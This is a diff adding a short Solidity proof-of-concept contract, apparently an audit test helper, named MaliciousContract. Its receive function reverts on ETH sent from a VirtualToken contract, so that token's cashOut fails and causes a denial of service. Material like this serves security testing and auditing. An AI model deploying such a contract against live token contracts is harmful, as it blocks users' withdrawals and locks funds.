@@ -1,0 +1,32 @@
+pragma solidity ^0.8.20;
+
+import {VirtualToken} from "../src/VirtualToken.sol";
+
+contract MaliciousContract {
+    address public owner;
+    address public virtualTokenAddress;
+
+    constructor(address _virtualTokenAddress) {
+        owner = msg.sender;
+        virtualTokenAddress = _virtualTokenAddress;
+    }
+
+    // Accept Ether from anyone except the VirtualToken contract
+    receive() external payable {
+        if (msg.sender == virtualTokenAddress) {
+            revert("Reverting on ETH receipt from VirtualToken");
+        }
+        // Accept Ether from others (e.g., when funding the contract)
+    }
+
+    // Function to perform the attack by interacting with `cashIn`
+    function attack() external payable {
+        // Ensure the contract has enough balance to perform cashIn
+        VirtualToken(virtualTokenAddress).cashIn{value: msg.value}(msg.value);
+    }
+
+    // Function to initiate cashOut (which will fail and cause DoS)
+    function triggerCashOut(uint256 amount) external {
+        VirtualToken(virtualTokenAddress).cashOut(amount);
+    }
+}
